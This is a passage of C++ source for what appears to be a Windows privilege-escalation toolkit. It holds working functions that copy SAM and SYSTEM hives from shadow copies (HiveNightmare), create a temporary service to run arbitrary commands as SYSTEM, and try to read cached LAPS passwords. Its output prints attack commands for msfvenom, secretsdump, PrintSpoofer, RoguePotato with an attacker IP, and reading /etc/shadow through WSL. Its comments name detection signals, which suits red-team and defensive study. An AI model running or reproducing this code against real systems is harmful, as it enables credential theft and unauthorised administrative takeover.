        r += "  msfvenom -p windows/x64/exec CMD=\"net localgroup administrators <user> /add\""
             " -f msi -o evil.msi\n";
    } else {
        r += "\n[not vulnerable] At least one key is 0 or unset.\n";
    }
    return r;
}

// ═════════════════════════════════════════════════════════════════════════════
// EoP — HiveNightmare (CVE-2021-36934)
// ═════════════════════════════════════════════════════════════════════════════

std::string PrivEsc::HiveNightmare() {
    // CVE-2021-36934: Windows 10/11 (before 2021-07 patches) incorrectly applies
    // BUILTIN\Users : (RX) ACL to the VSS shadow copy of SYSTEM hive files.
    // A low-privilege user can read shadow-copy SAM/SYSTEM and extract NTLM hashes.
    // Detection: CreateFile on shadow-copy hive path from a non-SYSTEM process.

    std::string r;

    // Check if the live SAM file is directly readable (should fail for non-admin)
    HANDLE hSam = CreateFileA("C:\\Windows\\System32\\config\\SAM",
                               GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hSam != INVALID_HANDLE_VALUE) {
        r += "LIVE SAM readable (unexpected — already admin/SYSTEM)\n";
        CloseHandle(hSam);
    } else {
        r += "Live SAM: access denied (normal)\n";
    }

    // Check shadow copies for readable hive files
    bool found = false;
    for (int i = 1; i <= 10 && !found; ++i) {
        std::string samPath = "\\\\.\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy" +
                              std::to_string(i) + "\\Windows\\System32\\config\\SAM";
        HANDLE h = CreateFileA(samPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, 0, NULL);
        if (h != INVALID_HANDLE_VALUE) {
            found = true;
            r += "\n[VULNERABLE] Shadow copy SAM readable:\n  " + samPath + "\n";
            r += "Extract hashes (run on attacker box):\n";
            r += "  Copy: cmd /c copy " + samPath + " C:\\Temp\\SAM\n";
            std::string sysPath = "\\\\.\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy" +
                                   std::to_string(i) + "\\Windows\\System32\\config\\SYSTEM";
            r += "  cmd /c copy " + sysPath + " C:\\Temp\\SYSTEM\n";
            r += "  secretsdump.py -sam SAM -system SYSTEM LOCAL\n";
            CloseHandle(h);
        }
    }
    if (!found) r += "Shadow copies: not found or not readable (not vulnerable / patched)\n";

    return r;
}

// ═════════════════════════════════════════════════════════════════════════════
// EoP — LAPS (Local Administrator Password Solution)
// ═════════════════════════════════════════════════════════════════════════════

std::string PrivEsc::LAPSCheck() {
    // If LAPS is deployed, computers store a rotating local admin password in AD.
    // This checks if LAPS is enabled and if the local LAPS password is cached.
    // Detection: RegQueryValueEx on AdmPwd keys from a non-admin process.

    std::string r = "LAPS Check:\n";

    auto queryDword = [](HKEY root, const char* sub, const char* val) -> DWORD {
        HKEY hk = NULL; DWORD data = 0, sz = sizeof(data);
        if (RegOpenKeyExA(root, sub, 0, KEY_QUERY_VALUE, &hk) == ERROR_SUCCESS) {
            RegQueryValueExA(hk, val, NULL, NULL, (BYTE*)&data, &sz);
            RegCloseKey(hk);
        }
        return data;
    };

    DWORD enabled = queryDword(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Policies\\Microsoft Services\\AdmPwd", "AdmPwdEnabled");
    r += "  AdmPwdEnabled = " + std::to_string(enabled) + "\n";
    if (enabled) r += "  [LAPS IS DEPLOYED — local admin password stored in AD]\n";
    else         r += "  [LAPS not detected]\n";

    // Try to read the LAPS-managed password (requires domain admin or delegated access)
    char pwd[256] = {}; DWORD sz = sizeof(pwd)-1; HKEY hk = NULL;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                      "SOFTWARE\\Policies\\Microsoft Services\\AdmPwd",
                      0, KEY_QUERY_VALUE, &hk) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hk, "AdminPwd", NULL, NULL, (BYTE*)pwd, &sz) == ERROR_SUCCESS)
            r += "  AdminPwd = " + std::string(pwd) + "\n";
        RegCloseKey(hk);
    }

    return r;
}

// ═════════════════════════════════════════════════════════════════════════════
// EoP — IMPERSONATION PRIVILEGES
// ═════════════════════════════════════════════════════════════════════════════

std::string PrivEsc::ImpersonationPrivCheck() {
    // Check the current process token for high-value impersonation privileges.
    // These enable Potato-family attacks (PrintSpoofer, RoguePotato, etc.):
    //   SeImpersonatePrivilege       → PrintSpoofer, RoguePotato, JuicyPotato
    //   SeAssignPrimaryTokenPrivilege→ CreateProcessAsUser escalation
    //   SeDebugPrivilege             → inject into SYSTEM processes (lsass)
    //   SeTakeOwnershipPrivilege     → take ownership of any file/key
    //   SeRestorePrivilege           → write arbitrary registry hives
    //   SeBackupPrivilege            → read any file (SAM dump)
    //   SeLoadDriverPrivilege        → load kernel driver (BYOVD)

    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return "privcheck: OpenProcessToken failed\n";

    DWORD sz = 0;
    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &sz);
    std::vector<BYTE> buf(sz);
    if (!GetTokenInformation(hToken, TokenPrivileges, buf.data(), sz, &sz)) {
        CloseHandle(hToken); return "privcheck: GetTokenInformation failed\n";
    }

    auto* tp = (TOKEN_PRIVILEGES*)buf.data();

    struct PrivInfo { LUID luid; const char* name; bool important; };
    std::vector<PrivInfo> table;

    // Build table of interesting privileges
    const char* interesting[] = {
        "SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege",
        "SeDebugPrivilege", "SeTakeOwnershipPrivilege",
        "SeRestorePrivilege", "SeBackupPrivilege",
        "SeLoadDriverPrivilege", "SeCreateTokenPrivilege",
        "SeTcbPrivilege", nullptr
    };
    for (int i = 0; interesting[i]; ++i) {
        LUID l = {}; LookupPrivilegeValueA(NULL, interesting[i], &l);
        table.push_back({l, interesting[i], true});
    }

    std::string r = "Token Privileges:\n";
    for (DWORD i = 0; i < tp->PrivilegeCount; ++i) {
        LUID l = tp->Privileges[i].Luid;
        DWORD attr = tp->Privileges[i].Attributes;
        char name[256] = {}; DWORD nsz = sizeof(name);
        LookupPrivilegeNameA(NULL, &l, name, &nsz);

        bool isEnabled  = (attr & SE_PRIVILEGE_ENABLED) != 0;
        bool isImportant = false;
        for (auto& pi : table)
            if (pi.luid.LowPart == l.LowPart && pi.luid.HighPart == l.HighPart)
                { isImportant = true; break; }

        if (isImportant || isEnabled) {
            r += "  ";
            r += isEnabled ? "[ENABLED]  " : "[disabled] ";
            r += name;
            r += "\n";
        }
    }

    // Summarise Potato attack paths
    LUID seImp = {}; LookupPrivilegeValueA(NULL, "SeImpersonatePrivilege", &seImp);
    for (DWORD i = 0; i < tp->PrivilegeCount; ++i) {
        if (tp->Privileges[i].Luid.LowPart == seImp.LowPart &&
            (tp->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED)) {
            r += "\n[POTATO PATH AVAILABLE] SeImpersonatePrivilege is enabled.\n";
            r += "  Exploits: PrintSpoofer, RoguePotato, JuicyPotatoNG\n";
            r += "  PrintSpoofer: PrintSpoofer64.exe -i -c cmd.exe\n";
            r += "  RoguePotato: RoguePotato.exe -r <attacker-ip> -e \"cmd.exe\" -l 9999\n";
            break;
        }
    }

    CloseHandle(hToken);
    return r;
}

// ═════════════════════════════════════════════════════════════════════════════
// EoP — LOCAL ADMIN → NT SYSTEM via service creation
// ═════════════════════════════════════════════════════════════════════════════

std::string PrivEsc::LocalAdminToSystem(const std::string& cmd) {
    // Creates a temporary kernel-driver-type service whose binary runs as SYSTEM.
    // This is the sc.exe-based technique (no exploit — needs local admin).
    // Detection: Service creation by a non-system binary is a Sysmon Event ID 7045.
    //   Also: new service name "svc_tmp_X" in Security log Event 4697.

    static int counter = 0;
    std::string svcName = "svc_tmp_" + std::to_string(GetCurrentProcessId()) +
                          "_" + std::to_string(counter++);

    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL,
                                     SC_MANAGER_CREATE_SERVICE | SC_MANAGER_CONNECT);
    if (!hSCM) return "system: OpenSCManager failed (need local admin)\n";

    // Create a Win32OwnProcess service that runs cmd.exe /c <command>
    std::string binPath = "cmd.exe /c \"" + cmd + "\"";

    SC_HANDLE hSvc = CreateServiceA(
        hSCM, svcName.c_str(), svcName.c_str(),
        SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
        binPath.c_str(),
        NULL, NULL, NULL,
        NULL,      // run as LocalSystem
        NULL);

    std::string r;
    if (!hSvc) {
        CloseServiceHandle(hSCM);
        return "system: CreateService failed (err=" +
               std::to_string(GetLastError()) + ")\n";
    }

    StartServiceA(hSvc, 0, NULL); // fails immediately (cmd.exe exits) but runs the command
    Sleep(1000);                  // wait for cmd.exe to execute
    DeleteService(hSvc);
    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);

    r = "system: service '" + svcName + "' created and started.\n";
    r += "  Command ran as SYSTEM: " + cmd + "\n";
    r += "  Detection: Security log 4697 (service install), Sysmon 7045\n";
    return r;
}

// ═════════════════════════════════════════════════════════════════════════════
// EoP — WSL (Windows Subsystem for Linux)
// ═════════════════════════════════════════════════════════════════════════════

std::string PrivEsc::WSLCheck() {
    // WSL can be used to run Linux tools (sudo, python, etc.) that bypass
    // Windows file-permission checks. Also: bash.exe writes to Windows paths
    // as the Windows user, potentially bypassing ACL enforcement in WSL1.
    // Detection: CreateFile on bash.exe / wsl.exe from a non-user-launched process.

    std::string r = "WSL Check:\n";

    const char* wslPaths[] = {
        "C:\\Windows\\System32\\bash.exe",
        "C:\\Windows\\System32\\wsl.exe",
        nullptr
    };
    for (int i = 0; wslPaths[i]; ++i) {
        DWORD attr = GetFileAttributesA(wslPaths[i]);
        if (attr != INVALID_FILE_ATTRIBUTES) {
            r += "  FOUND: " + std::string(wslPaths[i]) + "\n";
        }
    }

    // Check registry for WSL installation
    HKEY hk = NULL;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                      "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Lxss",
                      0, KEY_READ, &hk) == ERROR_SUCCESS) {
        r += "  [WSL INSTALLED] Registry key Lxss exists\n";
        // Enumerate distributions
        char distro[256] = {}; DWORD dsz = sizeof(distro); DWORD idx = 0;
        while (RegEnumKeyExA(hk, idx++, distro, &dsz, NULL, NULL, NULL, NULL)
               == ERROR_SUCCESS) {
            HKEY hd = NULL;
            std::string sub = std::string(
                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Lxss\\") + distro;
            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, sub.c_str(), 0, KEY_READ, &hd)
                == ERROR_SUCCESS) {
                char name[256] = {}; DWORD nsz = sizeof(name);
                RegQueryValueExA(hd, "DistributionName", NULL, NULL, (BYTE*)name, &nsz);
                r += "  Distro: " + std::string(name) + "\n";
                RegCloseKey(hd);
            }
            dsz = sizeof(distro);
        }
        RegCloseKey(hk);
        r += "  Abuse: wsl.exe -e /bin/bash -c \"cat /etc/shadow\"\n";
        r += "         wsl.exe -u root -e /bin/bash\n";
    } else {
        r += "  WSL registry key not found\n";
    }

    return r;
}

// ═════════════════════════════════════════════════════════════════════════════
// EoP — NAMED PIPE ENUMERATION
// ═════════════════════════════════════════════════════════════════════════════

std::string PrivEsc::NamedPipeEnum() {
    // Named pipes can be used for privilege escalation if a SYSTEM process
    // connects to a pipe we create (token impersonation via ImpersonateNamedPipeClient).
    // Detection: FindFirstFile on \\.\\pipe\\ from a non-service process.

    WIN32_FIND_DATAA ffd;
    HANDLE hFind = FindFirstFileA("\\\\.\\pipe\\*", &ffd);
    if (hFind == INVALID_HANDLE_VALUE)
        return "pipes: FindFirstFile failed\n";

    std::string r = "Named Pipes:\n";
    int count = 0;
    do {
        r += "  " + std::string(ffd.cFileName) + "\n";
        ++count;
    } while (FindNextFileA(hFind, &ffd));
    FindClose(hFind);

    r += "\nTotal: " + std::to_string(count) + " pipes\n";
    r += "Impersonation note: if a SYSTEM process connects to your pipe,\n"
         "  ImpersonateNamedPipeClient() grants its token.\n";
    return r;
}

// ═════════════════════════════════════════════════════════════════════════════
// EoP — PRINT SPOOLER CHECK (PrintSpoofer prerequisite)
// ═════════════════════════════════════════════════════════════════════════════

std::string PrivEsc::PrintSpooferCheck() {
    // PrintSpoofer abuses SeImpersonatePrivilege + Print Spooler pipe trick.
    // Prerequisite: Spooler service running + SeImpersonatePrivilege enabled.
    // Detection: SpoolSS.exe creating a named pipe listener;
    //   Sysmon Event 17/18 (pipe created/connected by non-spooler process).

    std::string r = "PrintSpoofer Prerequisites:\n";

    // Check if Spooler service is running
    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCM) {
        SC_HANDLE hSvc = OpenServiceA(hSCM, "Spooler", SERVICE_QUERY_STATUS);
        if (hSvc) {
            SERVICE_STATUS ss = {};
            QueryServiceStatus(hSvc, &ss);
            bool running = (ss.dwCurrentState == SERVICE_RUNNING);
            r += "  Spooler service: " + std::string(running ? "RUNNING" : "stopped") + "\n";
            if (running) r += "  [OK] Spooler is running\n";
            CloseServiceHandle(hSvc);
        }
        CloseServiceHandle(hSCM);
    }

    // Check SeImpersonatePrivilege (re-use ImpersonationPrivCheck logic inline)
    HANDLE hToken = NULL;
    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
    if (hToken) {
        DWORD sz = 0; GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &sz);
        std::vector<BYTE> buf(sz);
        GetTokenInformation(hToken, TokenPrivileges, buf.data(), sz, &sz);
        auto* tp = (TOKEN_PRIVILEGES*)buf.data();
        LUID seImp = {}; LookupPrivilegeValueA(NULL, "SeImpersonatePrivilege", &seImp);
        for (DWORD i = 0; i < tp->PrivilegeCount; ++i) {
            if (tp->Privileges[i].Luid.LowPart == seImp.LowPart &&
                tp->Privileges[i].Luid.HighPart == seImp.HighPart) {
                bool en = (tp->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED) != 0;
                r += "  SeImpersonatePrivilege: " + std::string(en?"ENABLED":"disabled") + "\n";
                if (en) {
                    r += "\n[VULNERABLE] Both conditions met — PrintSpoofer works.\n";
                    r += "  PrintSpoofer64.exe -i -c \"cmd.exe\"\n";
                    r += "  (or use JuicyPotatoNG / GodPotato for universal coverage)\n";
                }
                break;
            }
        }
        CloseHandle(hToken);
    }

    return r;
}

// ═════════════════════════════════════════════════════════════════════════════
// EoP — COMPREHENSIVE SCAN (runs all checks)
// ═════════════════════════════════════════════════════════════════════════════

std::string PrivEsc::FullScan() {
    // Runs all privesc checks and returns a consolidated report.
    // Detection signal is high — this triggers many of the individual alerts above
    // in rapid succession, which itself is a strong behavioral indicator.
    std::string r = "=== PrivEsc Full Scan ===\n\n";

    r += "--- Token Privileges ---\n";
    r += ImpersonationPrivCheck() + "\n";

    r += "--- AlwaysInstallElevated ---\n";
    r += AlwaysInstallElevated() + "\n";

    r += "--- HiveNightmare ---\n";
    r += HiveNightmare() + "\n";

    r += "--- Unquoted Service Paths ---\n";
    r += UnquotedServicePaths() + "\n";

    r += "--- Registry Passwords ---\n";
    r += RegistryPasswordSearch() + "\n";

    r += "--- Credential Files ---\n";
    r += PasswordFileSearch() + "\n";

    r += "--- Stored Credentials ---\n";
    r += StoredCredentials() + "\n";

    r += "--- LAPS ---\n";
    r += LAPSCheck() + "\n";

    r += "--- WSL ---\n";
    r += WSLCheck() + "\n";

    r += "--- PrintSpoofer ---\n";
    r += PrintSpooferCheck() + "\n";

    return r;
}
